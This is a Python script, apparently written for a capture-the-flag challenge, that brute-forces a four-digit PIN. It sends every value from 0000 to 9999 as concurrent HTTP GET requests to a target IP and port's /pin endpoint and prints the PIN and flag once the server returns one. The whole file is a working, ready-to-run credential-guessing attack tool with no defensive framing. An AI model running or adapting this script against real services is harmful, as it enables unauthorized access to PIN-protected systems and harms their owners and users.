import requests
import concurrent.futures
import argparse

def try_pin(ip, port, pin):
    """
    Attempts to brute-force a PIN by sending HTTP requests to the target server.

    Parameters:
    - ip (str): The target server's IP address.
    - port (int): The target port number.
    - pin (int): The 4-digit PIN being tested.

    Returns:
    - str: The correct PIN if found, otherwise None.
    """
    formatted_pin = f"{pin:04d}"  # Ensures PIN is always a 4-digit string (e.g., 0007)
    
    try:
        # Sends a GET request to the server with the current PIN attempt
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}", timeout=5)

        # If the request succeeds, check if the response contains the flag
        if response.status_code == 200:
            try:
                json_data = response.json()  # Ensure response is JSON before parsing
                if 'flag' in json_data:
                    print(f"Correct PIN found: {formatted_pin}")
                    print(f"Flag: {json_data['flag']}")
                    return formatted_pin  # Stop further execution
            except requests.exceptions.JSONDecodeError:
                pass  # Handle cases where the response isn't in JSON format
    except requests.exceptions.RequestException:
        pass  # Handle connection errors, timeouts, and other request issues

    return None  # Return None if the correct PIN is not found

def main():
    """
    Parses command-line arguments and runs the brute-force attack in parallel threads.
    """
    parser = argparse.ArgumentParser(description="Brute-force a 4-digit PIN.")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port number")
    args = parser.parse_args()

    ip, port = args.ip, args.port

    # Use ThreadPoolExecutor to speed up brute-force attempts with concurrent requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        # Submits all PIN attempts (0000 to 9999) as separate threads
        future_to_pin = {executor.submit(try_pin, ip, port, pin): pin for pin in range(10000)}

        # Iterates through completed tasks to check if the correct PIN was found
        for future in concurrent.futures.as_completed(future_to_pin):
            result = future.result()
            if result:
                executor.shutdown(wait=False)  # Stop all other threads if the correct PIN is found
                break

if __name__ == "__main__":
    main()
